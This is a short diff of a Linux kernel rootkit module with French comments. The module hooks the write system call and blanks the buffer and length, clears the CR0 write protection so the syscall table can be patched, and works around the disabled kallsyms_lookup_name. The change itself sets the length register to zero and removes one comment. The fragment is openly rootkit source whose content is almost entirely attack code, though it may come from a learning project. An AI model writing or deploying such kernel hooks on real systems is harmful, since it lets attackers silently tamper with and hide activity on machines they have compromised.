@@ -42,7 +42,7 @@ asmlinkage int hook_write(struct pt_regs *regs)
         //copy_to_user((void __user *)buf, 0, count);
         memset(regs->si, 0, count);
         //regs->si = 0;
-        //regs->dx = 1;
+        regs->dx = 0;
     }
     
     /* appel du vrai sys_call write avec les nouveaux arguments */
@@ -71,7 +71,6 @@ inline void unprotect_memory(void)
     cr0_write(cr0);
 }
 
-/* Module initialization function */
 int __init rootkit_init_hook(void)
 {
     /* pour régler de le kallsyms_lookup_name pas défini (déactivé par sécurité) */
